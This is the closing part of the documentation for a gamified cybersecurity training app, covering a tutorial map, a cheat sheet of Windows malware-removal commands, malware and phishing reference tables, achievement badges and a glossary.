│  INTERMEDIATE TUTORIALS               │
│  └─ Hands-On Malware Removal Lab     │
└───────────────────────────────────────┘
    ↓
┌───────────────────────────────────────┐
│  ADVANCED TUTORIALS                   │
│  ├─ Malware Incident Response        │
│  ├─ Trojan Tutorial (Hacker POV)     │
│  └─ [More coming soon]               │
└───────────────────────────────────────┘
    ↓
Landing Page (XP & Progress Saved)
```

---

# 📝 Quick Reference Sheets

## Command Cheat Sheet (Intermediate Lab)

### Detection
```bash
tasklist              # List processes
netstat -ano          # Network connections
dir %appdata%         # Check AppData folder
help                  # Show command help
```

### Containment
```bash
taskkill /F /IM [process.exe]      # Kill process
netsh advfirewall firewall add rule name="block" dir=out remoteip=[IP] action=block
```

### Eradication
```bash
reg delete "HKCU\...\Run" /v "[KeyName]" /f    # Remove registry
del /F /Q "[filepath]"                         # Delete file
schtasks /delete /tn "[TaskName]" /f           # Remove task
```

---

## Malware Types Quick Reference

| Type | How It Spreads | Main Goal | Example |
|------|----------------|-----------|---------|
| **Virus** | Files (USB, email) | Replicate, damage | CIH, ILOVEYOU |
| **Worm** | Network (automatic) | Spread rapidly | WannaCry, Conficker |
| **Trojan** | Disguise as software | Backdoor access | Zeus, Emotet |
| **Ransomware** | Phishing, exploits | Encrypt files | Locky, Ryuk |
| **Spyware** | Downloads, bundles | Steal data | Keyloggers |
| **Adware** | Free software | Show ads | Browser hijackers |

---

## Phishing Red Flags Checklist

- ❌ Generic greeting ("Dear Customer")
- ❌ Urgent/threatening language
- ❌ Suspicious sender domain
- ❌ Typos in sender address
- ❌ Shortened URLs (bit.ly)
- ❌ Requests for passwords/SSN
- ❌ Too good to be true offers
- ❌ High-pressure deadlines
- ❌ Unexpected attachments
- ❌ Poor grammar/spelling

---

# 🏆 Achievement System

### Tutorial Completion Badges

| Badge | Requirement | Reward |
|-------|-------------|--------|
| **🎓 Fundamentals Master** | Complete CIA Triad tutorial | 200 XP |
| **🌐 Network Ninja** | Complete Network Basics | 200 XP |
| **🔒 Crypto Expert** | Complete Encryption tutorial | 200 XP |
| **🦠 Malware Hunter** | Complete Malware Types | 200 XP |
| **🎣 Phishing Detective** | Complete Phishing Lab | 200 XP |
| **⚔️ Defender** | Complete Malware Removal Lab | 200 XP |
| **🚨 Incident Responder** | Complete Advanced Scenario | 200 XP |

### Special Achievements

| Badge | Requirement | Reward |
|-------|-------------|--------|
| **🏅 Perfect Score** | Get 100% on any tutorial | Bonus 50 XP |
| **⚡ Speed Demon** | Complete timed tutorial in half time | Bonus 100 XP |
| **🎯 All Cleared** | Complete all beginner tutorials | Bonus 200 XP |
| **👑 Elite Security** | Reach Challenger rank | Special badge |

---

# 📖 Glossary

**C2 (Command & Control):** Server that attackers use to control malware remotely.

**CIA Triad:** Confidentiality, Integrity, Availability - core security principles.

**Encryption:** Converting data into unreadable code using a key.

**Firewall:** Security system that monitors and controls network traffic.

**Payload:** Malicious code that performs the main attack function.

**Persistence:** Technique malware uses to survive reboots.

**Phishing:** Social engineering attack using fake emails/websites.

**Registry:** Windows database storing system/application settings.

**UAC (User Account Control):** Windows security feature requiring permission for admin actions.

**Zero-Day:** Vulnerability unknown to software vendor, no patch available.

---

# 📞 Support & Resources

### Having Trouble?

1. **Check hints** - Wait 15 seconds for automatic hints
2. **Use help command** - Type `help` in CMD tutorials
3. **Review tutorial sections** - Use BACK button to revisit
4. **Reference sheets** - Built-in guides available

### Report Issues

If you encounter bugs or have suggestions:
- File an issue on the GitHub repository
- Contact game support team

---

**Document Version:** 1.0  
**Last Updated:** December 3, 2025  
**Total Tutorials:** 8 (5 Beginner, 1 Intermediate, 2 Advanced)  
**Total Questions:** 75+ with complete answers  

---

## 🎉 Good Luck, Security Trainee!

**Remember:** The best defense is knowledge. Complete all tutorials to become a cybersecurity expert!

**Pro Tips:**
- ✅ Read all feedback carefully
- ✅ Take your time on quizzes
- ✅ Practice command-line labs multiple times
- ✅ Apply what you learn to real-world security
- ✅ Always verify before clicking links!

**Stay Safe Online!** 🔒
